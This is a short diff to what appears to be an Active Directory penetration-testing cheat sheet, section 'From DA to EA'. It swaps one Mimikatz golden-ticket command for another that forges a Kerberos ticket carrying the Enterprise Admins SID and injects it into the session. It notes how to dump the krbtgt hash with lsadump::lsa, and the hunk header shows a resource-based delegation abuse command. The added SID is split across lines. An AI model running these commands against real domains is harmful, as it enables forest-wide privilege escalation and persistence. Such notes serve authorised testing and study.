@@ -171,7 +171,8 @@ set-adcomputer <target> -PrincipalsAllowedToDelegateToAccount attacker$ -Verbose
 
 5.4 From DA to EA
 
-invoke-mimikatz -command '"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-4056425676-3036975250-1243519898 /sids:S-1-5-21-3331877400-209796306-1317730910-519 /rc4:da6010de93e6e1c94bdd90bb42a9920e /ptt"'
+kerberos::golden /user:Administrator /domain:sub.domain.local /sid:S-1-5-21-9489
+11695-1962824894-4291460450 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /krbtgt:ae5ef6353b190da04cc7a63b79895e5e /ptt
 
 SID parameter refers to current domain SID. SIDS is a combination of target domain SID + 519 (Enterprise Admins group). rc4: is krbtgt hash or external trust key (can be dumped by Invoke-Mimikatz -Command '"lsadump::lsa patch"' on dc)
 
